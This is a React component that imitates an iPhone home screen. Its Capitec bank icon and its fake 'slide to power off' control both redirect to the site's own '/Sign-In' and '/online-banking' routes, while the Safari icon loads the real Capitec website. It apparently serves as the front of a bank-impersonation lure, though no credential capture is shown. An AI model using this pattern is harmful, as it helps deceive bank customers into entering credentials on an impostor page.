import { useEffect, useRef, useState } from "react";

const wallpapers = [
    "/images/IphoneBackground.jpg",
    "/images/IphonebackgroundBlue.png",
];

function IOSHome() {
    const [wallpaperIndex, setWallpaperIndex] = useState(0);
    const [safariOpen, setSafariOpen] = useState(false);
    const [powerDownOpen, setPowerDownOpen] = useState(false);
    const [shuttingDown, setShuttingDown] = useState(false);

    const sliderContainerRef = useRef(null);
    const sliderHandleRef = useRef(null);

    const draggingRef = useRef(false);
    const startXRef = useRef(0);
    const maxSlideRef = useRef(0);

    useEffect(() => {
        wallpapers.forEach((url) => {
            const img = new Image();
            img.src = url;
        });
    }, []);

    useEffect(() => {
        const interval = setInterval(() => {
            setWallpaperIndex(
                (current) => (current + 1) % wallpapers.length
            );
        }, 300000);

        return () => clearInterval(interval);
    }, []);

    const openCapitec = (e) => {
        e.preventDefault();
        window.location.href = "/Sign-In";
    };

    const openSafari = (e) => {
        e.preventDefault();

        setSafariOpen(true);

        window.open(
            "https://www.capitecbank.co.za",
            "_blank"
        );
    };

    const closeSafari = (e) => {
        e.preventDefault();
        setSafariOpen(false);
    };

    const openShutdown = (e) => {
        e.preventDefault();
        setPowerDownOpen(true);
    };

    const cancelShutdown = () => {
        setPowerDownOpen(false);
        resetSlider();
    };

    const startDrag = (e) => {
        e.preventDefault();

        const clientX =
            e.type === "touchstart"
                ? e.touches[0].clientX
                : e.clientX;

        draggingRef.current = true;
        startXRef.current = clientX;

        if (
            sliderContainerRef.current &&
            sliderHandleRef.current
        ) {
            maxSlideRef.current =
                sliderContainerRef.current.offsetWidth -
                sliderHandleRef.current.offsetWidth -
                10;

            sliderHandleRef.current.style.transition = "none";
        }
    };

    const doDrag = (e) => {
        if (!draggingRef.current) return;

        const clientX =
            e.type === "touchmove"
                ? e.touches[0].clientX
                : e.clientX;

        let deltaX =
            clientX - startXRef.current;

        if (deltaX < 0) {
            deltaX = 0;
        }

        if (deltaX > maxSlideRef.current) {
            deltaX = maxSlideRef.current;
        }

        if (sliderHandleRef.current) {
            sliderHandleRef.current.style.left =
                `${deltaX + 5}px`;
        }

        if (
            deltaX >= maxSlideRef.current
        ) {
            draggingRef.current = false;
            triggerFinalShutdown();
        }
    };

    const endDrag = () => {
        if (!draggingRef.current) return;

        draggingRef.current = false;
        resetSlider();
    };

    const resetSlider = () => {
        if (sliderHandleRef.current) {
            sliderHandleRef.current.style.transition =
                "left 0.3s ease";

            sliderHandleRef.current.style.left =
                "5px";
        }
    };

    const triggerFinalShutdown = () => {
        setPowerDownOpen(false);
        setShuttingDown(true);

        setTimeout(() => {
            setTimeout(() => {
                window.location.href = "/online-banking";
            }, 1500);
        }, 2000);
    };

    useEffect(() => {
        window.addEventListener(
            "mousemove",
            doDrag
        );

        window.addEventListener(
            "touchmove",
            doDrag,
            { passive: false }
        );

        window.addEventListener(
            "mouseup",
            endDrag
        );

        window.addEventListener(
            "touchend",
            endDrag
        );

        return () => {
            window.removeEventListener(
                "mousemove",
                doDrag
            );

            window.removeEventListener(
                "touchmove",
                doDrag
            );

            window.removeEventListener(
                "mouseup",
                endDrag
            );

            window.removeEventListener(
                "touchend",
                endDrag
            );
        };
    });

    return (
        <>
            <style>{`
                .ios-home-content {
                    --bezel: #111;
                    --screen: #000;
                    --status-bar: rgba(0,0,0,0.5);
                    --dock-bg: rgba(255,255,255,0.25);

                    position: relative;
                    width: 100%;
                    height: 100%;
                    overflow: hidden;

                    font-family:
                        -apple-system,
                        BlinkMacSystemFont,
                        "Segoe UI",
                        Roboto,
                        Arial,
                        sans-serif;

                    color: white;
                }

                .ios-home-content *,
                .ios-home-content *::before,
                .ios-home-content *::after {
                    box-sizing: border-box;
                }

                .ios-home-content .wallpaper {
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;

                    background-position: center;
                    background-size: cover;
                    background-repeat: no-repeat;

                    z-index: 1;

                    display: block;
                    visibility: visible;
                    opacity: 1;

                    transition:
                        background-image 0.8s ease;
                }

                .ios-home-content .status {
                    position: absolute;
                    top: 16px;
                    left: 20px;
                    right: 20px;

                    height: 20px;

                    display: flex;
                    align-items: center;
                    justify-content: space-between;

                    font-size: 13px;
                    font-weight: 600;

                    opacity: 0.9;

                    z-index: 4;
                    color: white;

                    pointer-events: none;
                }

                .ios-home-content .status .left {
                    display: flex;
                    gap: 8px;
                }

                .ios-home-content .status .right {
                    display: flex;
                    align-items: center;
                    gap: 5px;
                }

                .ios-home-content .app-grid {
                    position: absolute;

                    top: 60px;
                    left: 0;
                    right: 0;
                    bottom: 70px;

                    padding: 0 18px;

                    display: grid;
                    grid-template-columns:
                        repeat(4, 1fr);

                    grid-auto-rows: 72px;

                    gap: 14px;

                    overflow: hidden;

                    z-index: 2;
                }

                .ios-home-content .app {
                    position: relative;

                    width: 100%;
                    height: 100%;

                    display: flex;
                    align-items: center;
                    justify-content: center;

                    flex-direction: column;

                    gap: 6px;

                    cursor: pointer;

                    -webkit-tap-highlight-color:
                        transparent;

                    transition:
                        transform 0.2s ease;
                }

                .ios-home-content .app:active {
                    transform: scale(0.9);
                }

                .ios-home-content .icon {
                     width: 50px;
                    height: 70px;
                    border-radius: 18px;
                    display: grid;
                    place-items: center;
                    color: #fff;
                    font-weight: 700;
                    font-size: 15px;
                    box-shadow: 0 6px 12px rgba(0,0,0,.25);
                    user-select: none;
                    transition: transform 0.2s ease;
                    overflow: hidden;
                }

                .ios-home-content .icon img {
                    width: 100%;
                    height: 100%;

                    object-fit: cover;

                    border-radius: 18px;

                    display: block;
                }

                .ios-home-content .label {
                    font-size: 11px;

                    color:
                        rgba(255,255,255,.95);

                    text-shadow:
                        0 1px 2px
                        rgba(0,0,0,.45);

                    text-align: center;

                    white-space: nowrap;
                }

                .ios-home-content .dock {
                    position: absolute;

                    bottom: 24px;
                    left: 18px;
                    right: 18px;

                    height: 60px;

                    padding: 8px 10px;

                    border-radius: 18px;

                    background:
                        var(--dock-bg);

                    backdrop-filter:
                        blur(20px);

                    -webkit-backdrop-filter:
                        blur(20px);

                    display: grid;

                    grid-template-columns:
                        repeat(4, 1fr);

                    gap: 12px;

                    z-index: 3;
                }

                .ios-home-content .dock .app {
                    height: 50px;
                }

                .ios-home-content .dock .icon {
                    width: 50px;
                    height: 50px;
                }

                .ios-home-content .open-overlay {
                    position: absolute;

                    left: 0;
                    top: 0;
                    right: 0;
                    bottom: 0;

                    background: #ffffff;

                    transform-origin:
                        var(--ox)
                        var(--oy);

                    transform:
                        translate(
                            var(--tx),
                            var(--ty)
                        )
                        scale(0.05);

                    border-radius: 22px;

                    opacity: 0;

                    pointer-events: none;

                    z-index: 8;
                }

                .ios-home-content
                    .open-overlay.active {
                    animation:
                        openZoom
                        .45s
                        cubic-bezier(.2,.7,.2,1)
                        forwards;
                }

                @keyframes openZoom {
                    0% {
                        opacity: 0;
                    }

                    10% {
                        opacity: 1;
                    }

                    100% {
                        opacity: 1;

                        transform:
                            translate(0,0)
                            scale(1);

                        border-radius: 0;
                    }
                }

                .ios-home-content .safari-overlay {
                    position: absolute;

                    top: 0;
                    left: 0;

                    width: 100%;
                    height: 100%;

                    background: white;

                    z-index: 9;

                    display: flex;
                    flex-direction: column;

                    opacity: 0;

                    pointer-events: none;

                    transition:
                        opacity 0.3s ease;
                }

                .ios-home-content
                    .safari-overlay.active {
                    opacity: 1;
                    pointer-events: all;
                }

                .ios-home-content .safari-header {
                    height: 44px;

                    background: #f2f2f7;

                    display: flex;

                    align-items: center;
                    justify-content: space-between;

                    padding: 0 10px;

                    border-bottom:
                        1px solid #e5e5ea;

                    flex-shrink: 0;
                }

                .ios-home-content
                    .safari-back-btn {
                    background: none;
                    border: none;

                    font-size: 16px;

                    color: #007AFF;

                    cursor: pointer;

                    padding: 8px 12px;
                }

                .ios-home-content
                    .safari-address-bar {
                    flex: 1;

                    margin: 0 10px;

                    padding: 8px 12px;

                    background: #e5e5ea;

                    border-radius: 8px;

                    font-size: 14px;

                    color: #000;

                    text-align: center;

                    overflow: hidden;
                    white-space: nowrap;
                    text-overflow: ellipsis;
                }

                .ios-home-content
                    .safari-content {
                    flex: 1;

                    background: #fff;

                    overflow: hidden;
                }

                .ios-home-content
                    .safari-iframe {
                    width: 100%;
                    height: 100%;

                    border: none;
                }

                .ios-home-content
                    .power-down-overlay {
                    position: absolute;

                    top: 0;
                    left: 0;

                    width: 100%;
                    height: 100%;

                    background:
                        rgba(0, 0, 0, 0.8);

                    backdrop-filter:
                        blur(10px);

                    -webkit-backdrop-filter:
                        blur(10px);

                    z-index: 20;

                    display: none;

                    flex-direction: column;

                    align-items: center;

                    justify-content: flex-start;

                    padding-top: 100px;

                    color: white;

                    opacity: 0;

                    transition:
                        opacity 0.5s ease;
                }

                .ios-home-content
                    .power-down-overlay.active {
                    display: flex;
                    opacity: 1;
                }

                .ios-home-content
                    .slider-container {
                    width: 80%;
                    height: 60px;

                    background:
                        rgba(255,255,255,0.2);

                    border-radius: 30px;

                    position: relative;

                    display: flex;

                    align-items: center;

                    padding: 5px;

                    margin-bottom: 20px;
                }

                .ios-home-content
                    .slider-handle {
                    width: 50px;
                    height: 50px;

                    background: #fff;

                    border-radius: 50%;

                    display: flex;

                    align-items: center;
                    justify-content: center;

                    cursor: grab;

                    position: absolute;

                    left: 5px;

                    z-index: 2;

                    box-shadow:
                        0 2px 5px
                        rgba(0,0,0,0.3);

                    touch-action: none;
                }

                .ios-home-content
                    .slider-handle:active {
                    cursor: grabbing;
                }

                .ios-home-content
                    .slider-handle img {
                    width: 25px;
                    height: 25px;

                    object-fit: contain;

                    filter: invert(1);
                }

                .ios-home-content
                    .slider-text {
                    width: 100%;

                    text-align: center;

                    font-size: 18px;

                    font-weight: 300;

                    user-select: none;

                    background:
                        linear-gradient(
                            90deg,
                            #666 0%,
                            #fff 50%,
                            #666 100%
                        );

                    background-size: 200% 100%;

                    -webkit-background-clip: text;
                    background-clip: text;

                    -webkit-text-fill-color:
                        transparent;

                    animation:
                        slide-text
                        2s infinite linear;
                }

                @keyframes slide-text {
                    0% {
                        background-position:
                            -100% 0;
                    }

                    100% {
                        background-position:
                            100% 0;
                    }
                }

                .ios-home-content
                    .cancel-btn {
                    margin-top: auto;

                    margin-bottom: 50px;

                    font-size: 20px;

                    cursor: pointer;

                    background:
                        rgba(255,255,255,0.2);

                    padding: 10px 40px;

                    border-radius: 20px;

                    transition:
                        transform .15s ease,
                        background .15s ease;
                }

                .ios-home-content
                    .cancel-btn:hover {
                    background:
                        rgba(255,255,255,0.3);
                }

                .ios-home-content
                    .cancel-btn:active {
                    transform: scale(.95);
                }

                .ios-home-content
                    .shutdown-black-screen {
                    position: absolute;

                    top: 0;
                    left: 0;

                    width: 100%;
                    height: 100%;

                    background: black;

                    z-index: 30;

                    display: none;

                    align-items: center;
                    justify-content: center;
                }

                .ios-home-content
                    .shutdown-spinner {
                    width: 30px;
                    height: 30px;

                    border:
                        3px solid
                        rgba(255,255,255,0.3);

                    border-top-color: #fff;

                    border-radius: 50%;

                    animation:
                        spin
                        1s linear infinite;
                }

                @keyframes spin {
                    to {
                        transform: rotate(360deg);
                    }
                }

                @media (max-width: 360px) {
                    .ios-home-content
                        .app-grid {
                        padding: 0 12px;
                        gap: 10px;
                    }

                    .ios-home-content
                        .icon {
                        width: 46px;
                        height: 46px;
                        border-radius: 16px;
                    }

                    .ios-home-content
                        .icon img {
                        border-radius: 16px;
                    }

                    .ios-home-content
                        .label {
                        font-size: 10px;
                    }

                    .ios-home-content
                        .dock {
                        left: 12px;
                        right: 12px;
                    }
                }

                @media (prefers-reduced-motion: reduce) {
                    .ios-home-content
                        .app,
                    .ios-home-content
                        .icon {
                        transition: none;
                    }

                    .ios-home-content
                        .open-overlay.active {
                        animation-duration: .01ms;
                    }

                    .ios-home-content
                        .slider-text {
                        animation: none;
                    }
                }
            `}</style>

            <div className="ios-home-content">

                {/* Wallpaper */}
                <div
                    className="wallpaper"
                    style={{
                        backgroundImage:
                            `url("${wallpapers[wallpaperIndex]}")`
                    }}
                />

                {/* Status */}
                <div className="status">
                    <div className="left">
                        <span>9:41</span>
                    </div>

                    <div className="right">
                        <span>78%</span>
                    </div>
                </div>

                {/* App Grid */}
                <div className="app-grid" id="grid">

                    <App
                        image="/images/appStore.jpg"
                        alt="App Store"
                        label="App Store"
                    />

                    <App
                        image="/images/photo.png"
                        alt="Photos"
                        label="Photos"
                    />

                    <App
                        image="/images/mail.png"
                        alt="Mail"
                        label="Mail"
                    />

                    <App
                        image="/images/calendar.png"
                        alt="Calendar"
                        label="Calendar"
                    />

                    <App
                        image="/images/phone.png"
                        alt="Phone"
                        label="Phone"
                    />

                    <App
                        image="/images/messages.png"
                        alt="Messages"
                        label="Messages"
                    />

                    <App
                        id="safariApp"
                        image="/images/safari.png"
                        alt="Safari"
                        label="Safari"
                        onClick={openSafari}
                    />

                    <App
                        id="capitecApp"
                        image="/images/bankIcon.png"
                        alt="Capitec"
                        label="Capitec"
                        onClick={openCapitec}
                    />

                    <App
                        image="/images/map.png"
                        alt="Maps"
                        label="Maps"
                    />

                    <App
                        image="/images/weather.png"
                        alt="Weather"
                        label="Weather"
                    />

                    <App
                        image="/images/clock.png"
                        alt="Clock"
                        label="Clock"
                    />

                    <App
                        id="shutdownApp"
                        image="/images/shutdown.png"
                        alt="Shutdown"
                        label="Power"
                        onClick={openShutdown}
                    />

                </div>

                {/* Dock */}
                <div className="dock">

                    <DockApp
                        image="/images/phone.png"
                        alt="Phone"
                    />

                    <DockApp
                        image="/images/messages.png"
                        alt="Messages"
                    />

                    <DockApp
                        image="/images/safari.png"
                        alt="Safari"
                    />

                    <DockApp
                        image="/images/appleMusic.png"
                        alt="Music"
                    />

                </div>

                {/* Open Animation */}
                <div
                    className="open-overlay"
                    id="openOverlay"
                />

                {/* Safari */}
                <div
                    className={`safari-overlay ${
                        safariOpen ? "active" : ""
                    }`}
                    id="safariOverlay"
                >
                    <div className="safari-header">

                        <button
                            className="safari-back-btn"
                            onClick={closeSafari}
                        >
                            ← Back
                        </button>

                        <div className="safari-address-bar">
                            https://www.capitecbank.co.za
                        </div>

                        <div
                            style={{
                                width: "60px"
                            }}
                        />

                    </div>

                    <div className="safari-content">
                        <iframe
                            className="safari-iframe"
                            title="Capitec Bank"
                            src="https://www.capitecbank.co.za"
                        />
                    </div>
                </div>

                {/* Power Down */}
                <div
                    className={`power-down-overlay ${
                        powerDownOpen ? "active" : ""
                    }`}
                    id="powerDownOverlay"
                >

                    <div
                        className="slider-container"
                        ref={sliderContainerRef}
                    >

                        <div
                            className="slider-handle"
                            ref={sliderHandleRef}
                            onMouseDown={startDrag}
                            onTouchStart={startDrag}
                        >

                            <img
                                src="/images/shutdown.png"
                                alt="Power"
                            />

                        </div>

                        <div className="slider-text">
                            slide to power off
                        </div>

                    </div>

                    <div
                        className="cancel-btn"
                        onClick={cancelShutdown}
                    >
                        Cancel
                    </div>

                </div>

                {/* Shutdown */}
                <div
                    className="shutdown-black-screen"
                    id="shutdownBlackScreen"
                    style={{
                        display:
                            shuttingDown
                                ? "flex"
                                : undefined
                    }}
                >
                    <div className="shutdown-spinner" />
                </div>

            </div>
        </>
    );
}

function App({
                 id,
                 image,
                 alt,
                 label,
                 onClick
             }) {
    return (
        <div
            className="app"
            id={id}
            onClick={onClick}
            onTouchEnd={onClick}
        >
            <div className="icon">
                <img
                    src={image}
                    alt={alt}
                />
            </div>

            <div className="label">
                {label}
            </div>
        </div>
    );
}

function DockApp({
                     image,
                     alt
                 }) {
    return (
        <div className="app">
            <div className="icon">
                <img
                    src={image}
                    alt={alt}
                />
            </div>
        </div>
    );
}

export default IOSHome;
